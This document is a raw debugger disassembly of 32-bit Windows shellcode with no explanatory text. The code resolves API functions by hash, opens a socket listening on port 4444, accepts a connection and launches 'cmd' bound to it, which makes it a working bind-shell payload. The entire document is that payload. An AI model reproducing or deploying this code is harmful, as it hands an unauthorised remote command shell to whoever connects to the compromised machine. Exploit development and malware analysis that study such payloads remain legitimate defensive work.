0022F333   90               NOP
0022F334   FC               CLD
0022F335   E8 82000000      CALL 0022F3BC
0022F33A   60               PUSHAD
0022F33B   89E5             MOV EBP,ESP
0022F33D   31C0             XOR EAX,EAX
0022F33F   64:8B50 30       MOV EDX,DWORD PTR FS:[EAX+30]
0022F343   8B52 0C          MOV EDX,DWORD PTR DS:[EDX+C]
0022F346   8B52 14          MOV EDX,DWORD PTR DS:[EDX+14]
0022F349   8B72 28          MOV ESI,DWORD PTR DS:[EDX+28]
0022F34C   0FB74A 26        MOVZX ECX,WORD PTR DS:[EDX+26]
0022F350   31FF             XOR EDI,EDI
0022F352   AC               LODS BYTE PTR DS:[ESI]
0022F353   3C 61            CMP AL,61
0022F355   7C 02            JL SHORT 0022F359
0022F357   2C 20            SUB AL,20
0022F359   C1CF 0D          ROR EDI,0D
0022F35C   01C7             ADD EDI,EAX
0022F35E  ^E2 F2            LOOPD SHORT 0022F352
0022F360   52               PUSH EDX
0022F361   57               PUSH EDI
0022F362   8B52 10          MOV EDX,DWORD PTR DS:[EDX+10]
0022F365   8B4A 3C          MOV ECX,DWORD PTR DS:[EDX+3C]
0022F368   8B4C11 78        MOV ECX,DWORD PTR DS:[ECX+EDX+78]
0022F36C   E3 48            JECXZ SHORT 0022F3B6
0022F36E   01D1             ADD ECX,EDX
0022F370   51               PUSH ECX
0022F371   8B59 20          MOV EBX,DWORD PTR DS:[ECX+20]
0022F374   01D3             ADD EBX,EDX
0022F376   8B49 18          MOV ECX,DWORD PTR DS:[ECX+18]
0022F379   E3 3A            JECXZ SHORT 0022F3B5
0022F37B   49               DEC ECX
0022F37C   8B348B           MOV ESI,DWORD PTR DS:[EBX+ECX*4]
0022F37F   01D6             ADD ESI,EDX
0022F381   31FF             XOR EDI,EDI
0022F383   AC               LODS BYTE PTR DS:[ESI]
0022F384   C1CF 0D          ROR EDI,0D
0022F387   01C7             ADD EDI,EAX
0022F389   38E0             CMP AL,AH
0022F38B  ^75 F6            JNZ SHORT 0022F383
0022F38D   037D F8          ADD EDI,DWORD PTR SS:[EBP-8]
0022F390   3B7D 24          CMP EDI,DWORD PTR SS:[EBP+24]
0022F393  ^75 E4            JNZ SHORT 0022F379
0022F395   58               POP EAX
0022F396   8B58 24          MOV EBX,DWORD PTR DS:[EAX+24]
0022F399   01D3             ADD EBX,EDX
0022F39B   66:8B0C4B        MOV CX,WORD PTR DS:[EBX+ECX*2]
0022F39F   8B58 1C          MOV EBX,DWORD PTR DS:[EAX+1C]
0022F3A2   01D3             ADD EBX,EDX
0022F3A4   8B048B           MOV EAX,DWORD PTR DS:[EBX+ECX*4]
0022F3A7   01D0             ADD EAX,EDX
0022F3A9   894424 24        MOV DWORD PTR SS:[ESP+24],EAX
0022F3AD   5B               POP EBX
0022F3AE   5B               POP EBX
0022F3AF   61               POPAD
0022F3B0   59               POP ECX
0022F3B1   5A               POP EDX
0022F3B2   51               PUSH ECX
0022F3B3   FFE0             JMP EAX
0022F3B5   5F               POP EDI
0022F3B6   5F               POP EDI
0022F3B7   5A               POP EDX
0022F3B8   8B12             MOV EDX,DWORD PTR DS:[EDX]
0022F3BA  ^EB 8D            JMP SHORT 0022F349
0022F3BC   5D               POP EBP
0022F3BD   68 33320000      PUSH 3233
0022F3C2   68 7773325F      PUSH 5F327377
0022F3C7   54               PUSH ESP
0022F3C8   68 4C772607      PUSH 726774C
0022F3CD   FFD5             CALL EBP
0022F3CF   B8 90010000      MOV EAX,190
0022F3D4   29C4             SUB ESP,EAX
0022F3D6   54               PUSH ESP
0022F3D7   50               PUSH EAX
0022F3D8   68 29806B00      PUSH 6B8029
0022F3DD   FFD5             CALL EBP
0022F3DF   6A 08            PUSH 8
0022F3E1   59               POP ECX
0022F3E2   50               PUSH EAX
0022F3E3  ^E2 FD            LOOPD SHORT 0022F3E2
0022F3E5   40               INC EAX
0022F3E6   50               PUSH EAX
0022F3E7   40               INC EAX
0022F3E8   50               PUSH EAX
0022F3E9   68 EA0FDFE0      PUSH E0DF0FEA
0022F3EE   FFD5             CALL EBP
0022F3F0   97               XCHG EAX,EDI
0022F3F1   68 0200115C      PUSH 5C110002
0022F3F6   89E6             MOV ESI,ESP
0022F3F8   6A 10            PUSH 10
0022F3FA   56               PUSH ESI
0022F3FB   57               PUSH EDI
0022F3FC   68 C2DB3767      PUSH 6737DBC2
0022F401   FFD5             CALL EBP
0022F403   57               PUSH EDI
0022F404   68 B7E938FF      PUSH FF38E9B7
0022F409   FFD5             CALL EBP
0022F40B   57               PUSH EDI
0022F40C   68 74EC3BE1      PUSH E13BEC74
0022F411   FFD5             CALL EBP
0022F413   57               PUSH EDI
0022F414   97               XCHG EAX,EDI
0022F415   68 756E4D61      PUSH 614D6E75
0022F41A   FFD5             CALL EBP
0022F41C   68 636D6400      PUSH 646D63
0022F421   89E3             MOV EBX,ESP
0022F423   57               PUSH EDI
0022F424   57               PUSH EDI
0022F425   57               PUSH EDI
0022F426   31F6             XOR ESI,ESI
0022F428   6A 12            PUSH 12
0022F42A   59               POP ECX
0022F42B   56               PUSH ESI
0022F42C  ^E2 FD            LOOPD SHORT 0022F42B
0022F42E   66:C74424 3C 010>MOV WORD PTR SS:[ESP+3C],101
0022F435   8D4424 10        LEA EAX,DWORD PTR SS:[ESP+10]
0022F439   C600 44          MOV BYTE PTR DS:[EAX],44
0022F43C   54               PUSH ESP
0022F43D   50               PUSH EAX
0022F43E   56               PUSH ESI
0022F43F   56               PUSH ESI
0022F440   56               PUSH ESI
0022F441   46               INC ESI
0022F442   56               PUSH ESI
0022F443   4E               DEC ESI
0022F444   56               PUSH ESI
0022F445   56               PUSH ESI
0022F446   53               PUSH EBX
0022F447   56               PUSH ESI
0022F448   68 79CC3F86      PUSH 863FCC79
0022F44D   FFD5             CALL EBP
0022F44F   89E0             MOV EAX,ESP
0022F451   4E               DEC ESI
0022F452   56               PUSH ESI
0022F453   46               INC ESI
0022F454   FF30             PUSH DWORD PTR DS:[EAX]
0022F456   68 08871D60      PUSH 601D8708
0022F45B   FFD5             CALL EBP
0022F45D   BB F0B5A256      MOV EBX,56A2B5F0
0022F462   68 A695BD9D      PUSH 9DBD95A6
0022F467   FFD5             CALL EBP
0022F469   3C 06            CMP AL,6
0022F46B   7C 0A            JL SHORT 0022F477
0022F46D   80FB E0          CMP BL,0E0
0022F470   75 05            JNZ SHORT 0022F477
0022F472   BB 4713726F      MOV EBX,6F721347
0022F477   6A 00            PUSH 0
0022F479   53               PUSH EBX
0022F47A   FFD5             CALL EBP
0022F47C   90               NOP
0022F47D   90               NOP
0022F47E   90               NOP
0022F47F   90               NOP
